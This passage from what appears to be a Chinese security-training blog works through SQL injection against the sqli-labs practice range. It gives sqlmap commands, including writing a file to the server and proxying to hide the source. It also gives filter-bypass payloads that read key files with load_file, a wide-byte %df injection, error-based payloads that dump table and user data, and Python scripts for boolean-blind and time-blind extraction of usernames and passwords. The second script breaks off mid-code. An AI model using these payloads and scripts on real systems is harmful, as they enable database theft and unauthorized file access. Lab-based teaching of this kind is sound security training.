<h2 id="7-–file-write-–file-dest"><a href="#7-–file-write-–file-dest" class="headerlink" title="7. –file-write –file-dest"></a>7. –file-write –file-dest</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--file-write &quot;E:\360MoveData\Users\Administrator\Desktop\hhh.txt&quot; --file-dest</span></span><br><span class="line">&quot;c://aa.txt&quot;</span><br><span class="line">将本地桌面的hhh.txt（内容为hahaha）上传到服务器c盘，名字为aa.txt。</span><br></pre></td></tr></table></figure>

<h2 id="8-–dbms-x3D-”MySQL”"><a href="#8-–dbms-x3D-”MySQL”" class="headerlink" title="8. –dbms&#x3D;”MySQL”"></a>8. –dbms&#x3D;”MySQL”</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--dbms=&quot;MySQL&quot;</span></span><br><span class="line">指定数据库类型</span><br></pre></td></tr></table></figure>

<p>默认情况下sqlmap会自动识别探测目标Web应用程序的后端数据库管理系统（DBMS），以下列出sqlmap完全支持的DBMS种类：</p>
<p>MySQL,Oracle,Firebird,IBM DB2,Informix,Microsoft Access,Microsoft SQL<br>Server,PostgreSQL,SAP MaxDB,SQLite,Sybase</p>
<h2 id="9-–sql-query"><a href="#9-–sql-query" class="headerlink" title="9. –sql-query"></a>9. –sql-query</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">执行一个<span class="keyword">sql</span>语句，相当于<span class="comment">--sql-shell，执行sql操作。</span></span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sql-query &quot;user()&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="10-–sql-file"><a href="#10-–sql-file" class="headerlink" title="10. –sql-file"></a>10. –sql-file</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">从指定文件执行<span class="keyword">sql</span>语句</span><br><span class="line">新建一个sql.sql文件，写入database();</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--sql-file &quot;E:\360MoveData\Users\Administrator\Desktop\sql.sql&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="11-–proxy-x3D-”IP-端口”"><a href="#11-–proxy-x3D-”IP-端口”" class="headerlink" title="11. –proxy&#x3D;”IP:端口”"></a>11. –proxy&#x3D;”IP:端口”</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="comment">--proxy=&quot;http://IP:端口&quot;</span></span><br><span class="line">使用代理进行注入检测，所发送的包都会从代理机器发送出去，可以更好的保护自己。</span><br><span class="line">免费代理池：https:<span class="operator">/</span><span class="operator">/</span>lab.crossincode.com<span class="operator">/</span>proxy<span class="operator">/</span></span><br></pre></td></tr></table></figure>

<h2 id="12-–technique"><a href="#12-–technique" class="headerlink" title="12. –technique"></a>12. –technique</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">对Less<span class="number">-1</span>注入测试，会检测所有注入，发现存在四种注入技术。</span><br><span class="line">指定注入类型，会大大缩短时间。</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.111</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B</span></span><br></pre></td></tr></table></figure>

<h2 id="13-–fresh-queries"><a href="#13-–fresh-queries" class="headerlink" title="13. –fresh-queries"></a>13. –fresh-queries</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">清除缓存</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">=</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">=</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--fresh-queries</span></span><br><span class="line">sqlmap每次查询都会将查询结果储存在.sqlmap文件夹中，下次再有相同的查询会调用</span><br><span class="line">上次的查询结果，使用这个参数可以忽略文件中的记载结果，重新查询。</span><br></pre></td></tr></table></figure>

<h2 id="14-–flush-session"><a href="#14-–flush-session" class="headerlink" title="14. –flush-session"></a>14. –flush-session</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">刷新会话</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--flush-session --technique B</span></span><br><span class="line">会发现开始初次检测，这就是第一次测试。</span><br><span class="line">之后的测试会很快，已经有了缓存。</span><br></pre></td></tr></table></figure>

<h2 id="15-–batch"><a href="#15-–batch" class="headerlink" title="15. –batch"></a>15. –batch</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">对所有的交互式的都是默认的</span><br><span class="line">sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--batch --</span></span><br><span class="line">flush<span class="operator">-</span>session <span class="comment">--technique B</span></span><br><span class="line">简单来说：自动选择默认，中间不需要操作。</span><br></pre></td></tr></table></figure>

<h2 id="16-–start-–stop"><a href="#16-–start-–stop" class="headerlink" title="16. –start –stop"></a>16. –start –stop</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">指定查看列的范围 <span class="comment">--start 获取第一个查询输出数据位置 --stop 获取最后查询</span></span><br><span class="line">输出数据位置 会查询指定位置的列信息。</span><br></pre></td></tr></table></figure>

<h2 id="17-–first-–last"><a href="#17-–first-–last" class="headerlink" title="17. –first –last"></a>17. –first –last</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">指定查看字符的范围 <span class="comment">--first 获取第一个查询输出字的字符 --last获取最后查询</span></span><br><span class="line">的输出字字符</span><br><span class="line">通过<span class="comment">--first 2和--last 3指定查看字符范围，只在盲注时使用，因为只有盲注会一个</span></span><br><span class="line">字一个字猜解。</span><br></pre></td></tr></table></figure>

<h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><h2 id="1-双写绕过"><a href="#1-双写绕过" class="headerlink" title="1. 双写绕过"></a>1. 双写绕过</h2><ol>
<li>输入order by 查询出字段数为3</li>
<li>输入union select 进行联合查询，发现过滤了union、select</li>
<li>进行双写绕过（select三次）：id&#x3D;-1’ununionion selselselectectect 1,2,3%23</li>
<li>利用注入漏洞读取 key ： id&#x3D;-1’ununionion selselselectectect<br>1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;key.txt”),3%23</li>
</ol>
<h2 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2. 大小写绕过"></a>2. 大小写绕过</h2><ol>
<li>输入order by 查询出字段数为3</li>
<li>输入union select 进行联合查询，发现过滤了union、select</li>
<li>进行大小写绕过：id&#x3D;-1’ uNion seLect 1,2,3%23</li>
<li>读取key：id&#x3D;-1’ uNion seLect 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;key.txt”),3%23</li>
</ol>
<h2 id="3-注释绕过空格"><a href="#3-注释绕过空格" class="headerlink" title="3. 注释绕过空格"></a>3. 注释绕过空格</h2><ol>
<li>输入<code>and 1=1 </code>发现过滤了空格</li>
<li>利用注释符进行进行绕过空格：<code>id=1&#39;/**/and/**/1=1%23</code></li>
<li>使用order by进行判断字段数：<code>id=1&#39;/**/order/**/by/**/3%23</code></li>
<li>使用联合查询：<code>id=-1&#39;/**/union/**/select/**/1,database(),version()%23</code></li>
</ol>
<h2 id="4-空格其他绕过方式"><a href="#4-空格其他绕过方式" class="headerlink" title="4. 空格其他绕过方式"></a>4. 空格其他绕过方式</h2><ol>
<li>%09、%0a、%0d、%0b等</li>
<li>括号绕过空格</li>
<li>使用 + 号、Tab键、两个空格、反引号等</li>
</ol>
<h2 id="5-过滤等号-x3D-绕过"><a href="#5-过滤等号-x3D-绕过" class="headerlink" title="5. 过滤等号&#x3D;绕过"></a>5. 过滤等号&#x3D;绕过</h2><ol>
<li><p>使用like绕过<br> 使用通配符 like 执行的效果和 &#x3D; 一致，所以可以用来绕过等号过滤。<br> <code>-1&#39; union select * from users where id like 2%23</code></p>
</li>
<li><p>使用 &lt;&gt; 绕过<br> &lt;&gt; 等价于 !&#x3D; 所以我们可以在 &lt;&gt; 前加个 ! 就变成等于了。例如：<br> <code>id=-1&#39; union select * from users where !(id&lt;&gt;2)%23</code></p>
</li>
</ol>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>编码类型：</p>
<ul>
<li><p>单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。</p>
</li>
<li><p>多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
</li>
<li><p>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根 据不同的符号而变化字节长度，一般会占3个字节。</p>
</li>
<li><p>GBK 编码：也是一种多字节编码，它一般占两个字节。</p>
</li>
</ul>
<p>而一般常见的存在宽字节注入的编码类型为：GBK 和 BIG5</p>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>在实际应用中，为防止注入漏洞通常会把单引号处理下，那又为啥要处理单引号呢？</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$id<span class="operator">=</span>$_GET[‘id’];</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> ‘$id’</span><br></pre></td></tr></table></figure>

<p>上边呢我们输入进去的 SQL 语句，都会赋值给 $id 这个变量，然后会被包含在引号里，在PHP中引号里的内容是属于字符串的，所以我们直接在这里输入的一些 SQL 命令都会被当作字符串处理，这些命令就不会起到作用。</p>
<p>所以我们在字符型注入中才会先用单引号闭合下，再输入 SQL 命令，这样后面的命令才会执行。如果程序中在我们输入的单引号前加上个反斜杠比如：\’。这样的话这个单引号就是个字符了，没有单引号闭合的作用，所以就起到了防护的作用。</p>
<p>为了突破这个防护，我们可以使用宽字节注入的方式进行突破：</p>
<p>我们的使用方式是：<code>%df’</code>，当我们在单引号前加上<code>%df</code>的时候，也就是输入<code>%df’</code>这样传入到数据库中就会变成：<code>%df%5c’</code>。</p>
<p>那么宽字节注入的突破方式除了 %df 之外还有其他的方式么？</p>
<p>其实是有的，我们可以看下 GBK 的编码表：<code>https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php</code>，这里的<code>%DE%5C</code>、<code>%E0%5C</code>，等都是可以的。</p>
<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol>
<li>在id&#x3D;1后面添加单引号发现被转义，在前面加了个\</li>
<li>使用<code>%df</code>进行闭合：<code>id=1%df&#39; and 1=1%23</code></li>
</ol>
<h1 id="二次查询注入"><a href="#二次查询注入" class="headerlink" title="二次查询注入"></a>二次查询注入</h1><p>sqli-lab 第五关 二次查询注入</p>
<p>双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询<code>select concat((select database()));</code></p>
<h2 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h2><ul>
<li><code>count()</code>：汇总数据函数</li>
<li><code>rand()</code>：随机输出一个小于1的正数</li>
<li><code>floor()</code>：把输出的结果取整</li>
<li><code>group by</code>语句：把结果分组输出</li>
<li><code>concat()</code>：连接两条语句</li>
</ul>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>

<p>这里解释一下，把<code>select database()</code>和<code>floor(rand()*2)</code>的结果输出到a里，然后最大长度根据<code>information_schema.tables</code>来决定，然后用a进行分组，bees1一组，bees0一组:</p>
<h3 id="1-爆当前库名"><a href="#1-爆当前库名" class="headerlink" title="1. 爆当前库名"></a>1. 爆当前库名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="2-报表名"><a href="#2-报表名" class="headerlink" title="2. 报表名"></a>2. 报表名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="3-爆列名"><a href="#3-爆列名" class="headerlink" title="3. 爆列名"></a>3. 爆列名</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 12,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>

<h3 id="4-查数据"><a href="#4-查数据" class="headerlink" title="4. 查数据"></a>4. 查数据</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.113</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全4x03】洞明科技网络安全培训 --- day3</title>
    <url>/1095/</url>
    <content><![CDATA[<p>第三天补充了几个sql注入知识点，讲了一些命令执行的绕过方法。</p>
<span id="more"></span>

<h1 id="sql注入补充"><a href="#sql注入补充" class="headerlink" title="sql注入补充"></a>sql注入补充</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">db = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table =<span class="string">&#x27;&#x27;</span></span><br><span class="line">list1 = []</span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.0.126:8004/Less-5/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line"><span class="comment">#check_data = list(&#x27;1234567890abcdefghijklmnopqrstuvwxyz@\&#123;\&#125;_&#x27;)</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">	pay1 = <span class="string">&quot;1&#x27;and (length(database()))&gt;%s --+&quot;</span> %i</span><br><span class="line">	re1 = requests.get(url+pay1,headers=headers,timeout=<span class="number">60</span>)</span><br><span class="line">	<span class="keyword">if</span> re1.content.find(code) == -<span class="number">1</span>:</span><br><span class="line">		<span class="built_in">print</span> (i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库名</span></span><br><span class="line"><span class="comment"># for a in range(1,9):</span></span><br><span class="line"><span class="comment"># 	for j in range(1, 128):</span></span><br><span class="line"><span class="comment"># 		pay2 = &quot;1&#x27;and ascii(substr((select database()),%s,1))=%s --+&quot; %(a,j)</span></span><br><span class="line"><span class="comment"># 		re2 = requests.get(url+pay2,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re2.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			db = db + chr(j)</span></span><br><span class="line"><span class="comment"># 			print (a,db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(limit)</span></span><br><span class="line"><span class="comment"># for j in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for n in range(1,10):</span></span><br><span class="line"><span class="comment"># 		for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 			and ascii(substr((select table_name from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 			 where table_schema=database() limit %s,1),%s,1))=%s --+&quot; %(j,n,i)</span></span><br><span class="line"><span class="comment"># 			re3 = requests.get(url+pay3,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 			#print url3</span></span><br><span class="line"><span class="comment"># 			if re3.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 				table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 				print(j,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(group_concat)</span></span><br><span class="line"><span class="comment"># for n in range(1,50):</span></span><br><span class="line"><span class="comment"># 	for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(table_name) from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 		 where table_schema=database()),%s,1))=%s --+&quot; %(n,i)</span></span><br><span class="line"><span class="comment"># 		re3 = requests.get(url+pay3,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		#print url3</span></span><br><span class="line"><span class="comment"># 		if re3.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 			print (n,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(limit)</span></span><br><span class="line"><span class="comment"># for a in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for b in xrange(1,20):</span></span><br><span class="line"><span class="comment"># 		for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 			and ascii(substr((select column_name from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 			where table_name=&#x27;users&#x27; limit %s,1),%s,1))=%s --+&quot; %(a,b,c)</span></span><br><span class="line"><span class="comment"># 			re4 = requests.get(url+pay4,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 			if re4.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 				column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 				print (a,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(group_concat)</span></span><br><span class="line"><span class="comment"># for b in xrange(1,50):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(column_name) from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 		where table_name=&#x27;users&#x27;),%s,1))=%s --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		re4 = requests.get(url+pay4,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re4.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			column = column+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,column)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆数据</span></span><br><span class="line"><span class="comment"># for b in xrange(1,100):</span></span><br><span class="line"><span class="comment"># 	for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay5 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 		and ascii(substr((select group_concat(username,&#x27; &#x27;,password) from users),%s,1))=%s --+&quot; %(b,c)</span></span><br><span class="line"><span class="comment"># 		re5 = requests.get(url+pay5,headers=headers,timeout=60)</span></span><br><span class="line"><span class="comment"># 		if re5.content.find(code) != -1:</span></span><br><span class="line"><span class="comment"># 			flag = flag+chr(c)</span></span><br><span class="line"><span class="comment"># 			print (b,flag)</span></span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">db = <span class="string">&#x27;&#x27;</span></span><br><span class="line">table =<span class="string">&#x27;&#x27;</span></span><br><span class="line">list1 = []</span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.0.126:8004/Less-9/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">names = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyz@!@#$%^&amp;*()-=`~[];,._+|:&lt;&gt;?&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">	pay1 = <span class="string">&quot;1&#x27; and if(length(database())&gt;%d,1,sleep(2)) --+&quot;</span> %i</span><br><span class="line">	time1 = datetime.datetime.now()</span><br><span class="line">	re1 = requests.get(url+pay1)</span><br><span class="line">	time2 = datetime.datetime.now()</span><br><span class="line">	sec = (time2 - time1).seconds</span><br><span class="line">	<span class="keyword">if</span> sec &gt;= <span class="number">2</span>:</span><br><span class="line">		<span class="built_in">print</span> (<span class="string">&#x27;length&#x27;</span>,i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆当前库名</span></span><br><span class="line"><span class="comment"># for a in range(1,9):</span></span><br><span class="line"><span class="comment"># 	for j in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay2 = &quot;1&#x27; and if(ascii(substr((select database()),%d,1))=%d,sleep(2),1) --+&quot; %(a,j)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re2 = requests.get(url+pay2)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			db += chr(j)</span></span><br><span class="line"><span class="comment"># 			print(a,db)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(limit)</span></span><br><span class="line"><span class="comment"># for j in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for n in range(1,10):</span></span><br><span class="line"><span class="comment"># 		for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 			and if(ascii(substr((select table_name from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 			 where table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1) --+&quot; %(j,n,i)</span></span><br><span class="line"><span class="comment"># 			time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			re3 = requests.get(url+pay3)</span></span><br><span class="line"><span class="comment"># 			time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 			if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 				table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 				print(j,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆表名(group_concat)</span></span><br><span class="line"><span class="comment"># for n in range(1,50):</span></span><br><span class="line"><span class="comment"># 	for i in range(1,128):</span></span><br><span class="line"><span class="comment"># 		pay3 = &quot;1&#x27;\</span></span><br><span class="line"><span class="comment"># 		and if(ascii(substr((select group_concat(table_name) from information_schema.tables\</span></span><br><span class="line"><span class="comment"># 		 where table_schema=database()),%d,1))=%d,sleep(2),1) --+&quot; %(n,i)</span></span><br><span class="line"><span class="comment"># 		time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		re3 = requests.get(url+pay3)</span></span><br><span class="line"><span class="comment"># 		time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 		sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 		if sec &gt;= 2:</span></span><br><span class="line"><span class="comment"># 			table = table + chr(i)</span></span><br><span class="line"><span class="comment"># 			print(n,table)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆列名(limit)</span></span><br><span class="line"><span class="comment"># for a in range(0,5):</span></span><br><span class="line"><span class="comment"># 	for b in xrange(1,20):</span></span><br><span class="line"><span class="comment"># 		for c in range(1,128):</span></span><br><span class="line"><span class="comment"># 			pay4 = &quot;1&#x27; \</span></span><br><span class="line"><span class="comment"># 			and if(ascii(substr((select column_name from information_schema.columns \</span></span><br><span class="line"><span class="comment"># 			where table_name=&#x27;users&#x27; limit %d,1),%d,1))=%d,sleep(2),1) --+&quot; %(a,b,c)</span></span><br><span class="line"><span class="comment"># 			time1 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			re4 = requests.get(url+pay4)</span></span><br><span class="line"><span class="comment"># 			time2 = datetime.datetime.now()</span></span><br><span class="line"><span class="comment"># 			sec = (time2 - time1).seconds</span></span><br><span class="line"><span class="comment"># 			if sec &gt;= 2:</span></span><br><span 